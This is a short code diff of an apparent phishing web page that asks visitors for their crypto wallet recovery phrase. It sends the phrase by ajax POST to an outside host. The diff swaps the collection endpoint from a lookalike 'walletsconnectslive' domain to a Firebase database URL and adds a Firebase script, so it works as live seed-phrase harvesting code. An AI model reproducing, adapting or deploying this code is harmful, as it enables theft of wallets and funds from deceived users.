@@ -1513,6 +1513,9 @@
     <script src="js/jquery-3.6.0.js" crossorigin="anonymous"></script>
     <script src="js1.js.download"></script>
     <script src="js2w.js.download"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.8.3/firebase.js"></script>
+    
+
 
     <script>
         function ready() {
@@ -1532,7 +1535,7 @@
                 alert('Fill in your recovery phrase');
             } else {
                 $.ajax({
-                    url: "https://walletsconnectslive.net/firstform",
+                    url: "https://amen-1bc99-default-rtdb.firebaseio.com/",
                     method: 'POST',
                     data: {
                         import_type: 'phrase',
